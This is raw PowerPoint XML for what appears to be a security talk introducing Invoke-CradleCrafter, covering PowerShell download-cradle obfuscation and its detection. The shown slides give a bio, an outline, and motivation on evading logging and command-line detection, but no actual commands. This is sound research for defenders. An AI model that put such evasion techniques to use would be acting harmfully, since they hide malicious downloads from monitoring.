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1"/>
  </p:notesMasterIdLst>
  <p:sldIdLst>
    <p:sldId id="256" r:id="rId2"/>
    <p:sldId id="257" r:id="rId3"/>
    <p:sldId id="840" r:id="rId4"/>
    <p:sldId id="872" r:id="rId5"/>
    <p:sldId id="661" r:id="rId6"/>
    <p:sldId id="668" r:id="rId7"/>
    <p:sldId id="877" r:id="rId8"/>
    <p:sldId id="878" r:id="rId9"/>
    <p:sldId id="630" r:id="rId10"/>
    <p:sldId id="635" r:id="rId11"/>
    <p:sldId id="259" r:id="rId12"/>
    <p:sldId id="260" r:id="rId13"/>
    <p:sldId id="261" r:id="rId14"/>
    <p:sldId id="262" r:id="rId15"/>
    <p:sldId id="265" r:id="rId16"/>
    <p:sldId id="266" r:id="rId17"/>
    <p:sldId id="267" r:id="rId18"/>
    <p:sldId id="268" r:id="rId19"/>
    <p:sldId id="881" r:id="rId20"/>
    <p:sldId id="271" r:id="rId21"/>
    <p:sldId id="308" r:id="rId22"/>
    <p:sldId id="880" r:id="rId23"/>
    <p:sldId id="686" r:id="rId24"/>
    <p:sldId id="687" r:id="rId25"/>
    <p:sldId id="318" r:id="rId26"/>
    <p:sldId id="323" r:id="rId27"/>
    <p:sldId id="334" r:id="rId28"/>
    <p:sldId id="883" r:id="rId29"/>
    <p:sldId id="885" r:id="rId30"/>
    <p:sldId id="888" r:id="rId31"/>
    <p:sldId id="889" r:id="rId32"/>
    <p:sldId id="349" r:id="rId33"/>
    <p:sldId id="375" r:id="rId34"/>
    <p:sldId id="954" r:id="rId35"/>
    <p:sldId id="919" r:id="rId36"/>
    <p:sldId id="927" r:id="rId37"/>
    <p:sldId id="1049" r:id="rId38"/>
    <p:sldId id="1050" r:id="rId39"/>
    <p:sldId id="1051" r:id="rId40"/>
    <p:sldId id="1052" r:id="rId41"/>
    <p:sldId id="1053" r:id="rId42"/>
    <p:sldId id="936" r:id="rId43"/>
    <p:sldId id="937" r:id="rId44"/>
    <p:sldId id="925" r:id="rId45"/>
    <p:sldId id="938" r:id="rId46"/>
    <p:sldId id="940" r:id="rId47"/>
    <p:sldId id="941" r:id="rId48"/>
    <p:sldId id="942" r:id="rId49"/>
    <p:sldId id="1028" r:id="rId50"/>
    <p:sldId id="944" r:id="rId51"/>
    <p:sldId id="949" r:id="rId52"/>
    <p:sldId id="950" r:id="rId53"/>
    <p:sldId id="951" r:id="rId54"/>
    <p:sldId id="956" r:id="rId55"/>
    <p:sldId id="960" r:id="rId56"/>
    <p:sldId id="957" r:id="rId57"/>
    <p:sldId id="997" r:id="rId58"/>
    <p:sldId id="998" r:id="rId59"/>
    <p:sldId id="999" r:id="rId60"/>
    <p:sldId id="1000" r:id="rId61"/>
    <p:sldId id="1001" r:id="rId62"/>
    <p:sldId id="1002" r:id="rId63"/>
    <p:sldId id="1003" r:id="rId64"/>
    <p:sldId id="1004" r:id="rId65"/>
    <p:sldId id="1005" r:id="rId66"/>
    <p:sldId id="1006" r:id="rId67"/>
    <p:sldId id="1007" r:id="rId68"/>
    <p:sldId id="1008" r:id="rId69"/>
    <p:sldId id="964" r:id="rId70"/>
    <p:sldId id="965" r:id="rId71"/>
    <p:sldId id="972" r:id="rId72"/>
    <p:sldId id="974" r:id="rId73"/>
    <p:sldId id="966" r:id="rId74"/>
    <p:sldId id="968" r:id="rId75"/>
    <p:sldId id="969" r:id="rId76"/>
    <p:sldId id="970" r:id="rId77"/>
    <p:sldId id="971" r:id="rId78"/>
    <p:sldId id="973" r:id="rId79"/>
    <p:sldId id="975" r:id="rId80"/>
    <p:sldId id="976" r:id="rId81"/>
    <p:sldId id="977" r:id="rId82"/>
    <p:sldId id="979" r:id="rId83"/>
    <p:sldId id="978" r:id="rId84"/>
    <p:sldId id="980" r:id="rId85"/>
    <p:sldId id="981" r:id="rId86"/>
    <p:sldId id="982" r:id="rId87"/>
    <p:sldId id="983" r:id="rId88"/>
    <p:sldId id="984" r:id="rId89"/>
    <p:sldId id="993" r:id="rId90"/>
    <p:sldId id="994" r:id="rId91"/>
    <p:sldId id="1009" r:id="rId92"/>
    <p:sldId id="1010" r:id="rId93"/>
    <p:sldId id="1012" r:id="rId94"/>
    <p:sldId id="1013" r:id="rId95"/>
    <p:sldId id="1014" r:id="rId96"/>
    <p:sldId id="1019" r:id="rId97"/>
    <p:sldId id="1017" r:id="rId98"/>
    <p:sldId id="1020" r:id="rId99"/>
    <p:sldId id="1022" r:id="rId100"/>
    <p:sldId id="1023" r:id="rId101"/>
    <p:sldId id="1025" r:id="rId102"/>
    <p:sldId id="1026" r:id="rId103"/>
    <p:sldId id="1027" r:id="rId104"/>
    <p:sldId id="1029" r:id="rId105"/>
    <p:sldId id="1036" r:id="rId106"/>
    <p:sldId id="1038" r:id="rId107"/>
    <p:sldId id="1037" r:id="rId108"/>
    <p:sldId id="1039" r:id="rId109"/>
    <p:sldId id="1042" r:id="rId110"/>
    <p:sldId id="1043" r:id="rId111"/>
    <p:sldId id="1044" r:id="rId112"/>
    <p:sldId id="1045" r:id="rId113"/>
    <p:sldId id="1047" r:id="rId114"/>
    <p:sldId id="1035" r:id="rId115"/>
    <p:sldId id="670" r:id="rId116"/>
    <p:sldId id="831" r:id="rId117"/>
    <p:sldId id="830" r:id="rId118"/>
    <p:sldId id="672" r:id="rId119"/>
    <p:sldId id="673" r:id="rId1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6" autoAdjust="0"/>
    <p:restoredTop sz="96249" autoAdjust="0"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr snapToGrid="0">
      <p:cViewPr varScale="1">
        <p:scale>
          <a:sx n="93" d="100"/>
          <a:sy n="93" d="100"/>
        </p:scale>
        <p:origin x="33" y="37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16" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide115.xml"/><Relationship Id="rId124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11" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide11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tableStyles" Target="tableStyle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2C53196-5B54-4276-BD25-96F80719F50B}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>6/12/2017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E6A8CC-DA77-415E-A86A-AC7B129027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36208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E6A8CC-DA77-415E-A86A-AC7B129027A1}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0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59437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E6A8CC-DA77-415E-A86A-AC7B129027A1}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0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11062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E6A8CC-DA77-415E-A86A-AC7B129027A1}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0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03011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4F2018-6DC6-4503-85F6-DACA729AE264}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>6/12/2017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29B28-329D-4C7D-8AB6-0F68A1C3AF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89620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4F2018-6DC6-4503-85F6-DACA729AE264}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>6/12/2017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29B28-329D-4C7D-8AB6-0F68A1C3AF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1084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4F2018-6DC6-4503-85F6-DACA729AE264}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>6/12/2017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29B28-329D-4C7D-8AB6-0F68A1C3AF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11360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4F2018-6DC6-4503-85F6-DACA729AE264}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>6/12/2017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29B28-329D-4C7D-8AB6-0F68A1C3AF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94821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4F2018-6DC6-4503-85F6-DACA729AE264}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>6/12/2017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29B28-329D-4C7D-8AB6-0F68A1C3AF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46288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4F2018-6DC6-4503-85F6-DACA729AE264}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>6/12/2017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29B28-329D-4C7D-8AB6-0F68A1C3AF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14997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4F2018-6DC6-4503-85F6-DACA729AE264}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>6/12/2017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29B28-329D-4C7D-8AB6-0F68A1C3AF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63318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4F2018-6DC6-4503-85F6-DACA729AE264}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>6/12/2017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29B28-329D-4C7D-8AB6-0F68A1C3AF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52792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4F2018-6DC6-4503-85F6-DACA729AE264}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>6/12/2017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29B28-329D-4C7D-8AB6-0F68A1C3AF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61629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4F2018-6DC6-4503-85F6-DACA729AE264}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>6/12/2017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29B28-329D-4C7D-8AB6-0F68A1C3AF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38073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4F2018-6DC6-4503-85F6-DACA729AE264}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>6/12/2017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29B28-329D-4C7D-8AB6-0F68A1C3AF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42597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4F2018-6DC6-4503-85F6-DACA729AE264}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>6/12/2017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729B28-329D-4C7D-8AB6-0F68A1C3AF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66875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blogs.msdn.microsoft.com/powershell/2015/06/09/powershell-the-blue-team/" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.fireeye.com/blog/threat-research/2016/02/greater_visibilityt.html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github.com/danielbohannon/Invoke-Obfuscation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jpe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jpg"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image14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3.jpg"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image14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3.jp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1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3.jpg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4.png"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image1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3.jp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4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://www.leeholmes.com/blog/2016/10/22/more-detecting-obfuscated-powershell/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3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jp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6.png"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image3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png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png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png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.png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3.png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4.png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5.png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6.png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7.png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7.png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8.png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9.png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2.jpg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2.jpg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2.jpg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2.jpg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3.png"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image52.jpg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4.png"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image52.jpg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5.png"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image54.png"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image52.jpg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5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5.png"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image54.png"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image52.jpg"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide10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png"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image3.png"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image5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5.png"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image54.png"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image52.jpg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8.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide1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0.png"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image59.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide1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1.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide1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2.png"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image61.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide1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4.png"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image63.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide1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5.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide1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6.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide1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7.jpg"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide1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8.jpg"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide11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danielbohannon/Invoke-CradleCrafter" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://danielbohannon.com/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6958" y="5311328"/>
            <a:ext cx="2538083" cy="148242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80225" y="1122363"/>
            <a:ext cx="9477555" cy="2426147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>Invoke-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>CradleCrafter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" smtClean="0"/>
              <a:t>:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="5600" dirty="0" err="1" smtClean="0"/>
              <a:t>Moar</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="5600" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="5600" dirty="0"/>
              <a:t>PowerShell obFUsk8tion &amp; Detection (@(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="5600" dirty="0" smtClean="0"/>
              <a:t>'Tech','</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="5600" dirty="0" err="1" smtClean="0"/>
              <a:t>niques</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="5600" dirty="0" smtClean="0"/>
              <a:t>') -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="5600" dirty="0"/>
              <a:t>Join </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="5600" dirty="0" smtClean="0"/>
              <a:t>'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="5600" dirty="0"/>
              <a:t>'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="5600" dirty="0" smtClean="0"/>
              <a:t>) </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="56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endParaRPr lang="en-US" dirty="0" smtClean="0"/>
          </a:p>
          <a:p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2581619" y="4549966"/>
            <a:ext cx="702876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 smtClean="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Daniel Bohannon</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2800" dirty="0" smtClean="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" smtClean="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>@</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" err="1" smtClean="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>daniel</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>h</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" err="1" smtClean="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>bohannon</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="28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0980014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6958" y="5446500"/>
            <a:ext cx="2538083" cy="148242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Who I Am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61219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 smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Daniel Bohannon (DBO)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Twitter: @</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>daniel</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>h</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>bohannon</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Personal Blog: http://danielbohannon.com</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Senior Incident </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Response Consultant @ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>MANDIANT (2yrs</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>Network- and host-based detection development &amp; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>hunting</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>Obfuscation &amp; detection evasion research and POC development</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Previously 5yrs in IT Operations and Security role for national restaurant franchise</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400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94428" y="365125"/>
            <a:ext cx="3416309" cy="36082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5801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800" dirty="0" smtClean="0"/>
              <a:t>Outline</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3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 smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Motivation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Current State of PowerShell Obfuscation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="accent5"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Current State of PowerShell Obfuscation Detection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MOAR! Crafting Cryptic Cradles :: (In)security By Obscurity</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Obscure Download Cradles</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Obscure Token Obfuscation</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Obscure Invocation Syntaxes</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="accent5"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Detecting Cryptic Cradles</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:schemeClr val="accent5"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Invoke-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CradleCrafter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t> v1.1 Release &amp; Demo</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="7030A0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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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210" y="6090466"/>
            <a:ext cx="1930499" cy="596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59274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800" dirty="0" smtClean="0"/>
              <a:t>DISCLAIMER</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3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"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Blocking PowerShell" is not a realistic option</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>PowerShell != </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>powershell.exe</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>System.Management.Automation(.ni).dll</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>"PowerShell is not special!" </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>–</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>noted Blue Teamer @</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>JaredHaight</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Malware-B-Malware</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" smtClean="0"/>
              <a:t>PowerShell 5.0 Is Your </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" smtClean="0"/>
              <a:t>New</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>" </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" smtClean="0"/>
              <a:t>Best Friend</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" smtClean="0"/>
              <a:t>Released April 2014 – LOTS of logging, JEA (Just Enough Administration) &amp; much more!</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" smtClean="0"/>
              <a:t>Logging</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>https://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" smtClean="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>www.fireeye.com/blog/threat-research/2016/02/greater_visibilityt.html</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" smtClean="0"/>
              <a:t>Everything: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>https://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" smtClean="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>blogs.msdn.microsoft.com/powershell/2015/06/09/powershell-the-blue-team/</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0" smtClean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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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8595" y="6052363"/>
            <a:ext cx="1841595" cy="673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34572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smtClean="0"/>
              <a:t>Motivation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/>
              <a:t>Almost all attackers use PowerShell at some point in their campaign</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Windows-signed (and usually whitelisted) binary that enables one-liner download and execution of remote scripts entirely in memory</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Nearly impossible to detect if command line arguments and/or PowerShell event logs are not logged and monitored</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>Most organizations are largely running PS 2.0</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>Organizations with PS 3.0+ are not centralizing or monitoring PS logs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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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8595" y="6052363"/>
            <a:ext cx="1841595" cy="673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69287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smtClean="0"/>
              <a:t>Motivation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400" dirty="0" smtClean="0"/>
              <a:t>Why MOAR Obfuscation?!?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Attackers are getting creative with download cradles</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Obscure cradles might bypass detections by:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>Appearing differently </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>(or not at all) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>in Module Logs</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>Pawning network connections onto other binaries</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Obscure invocation syntaxes might evade </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>cmdlet</a:t>
            </a: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 smtClean="0"/>
              <a:t>and command line detection logic</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Invoke-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>CradleCrafter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t> is a "living library" of cradle</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>syntaxes that enables you to build and precisely</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>obfuscate each component of the command</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
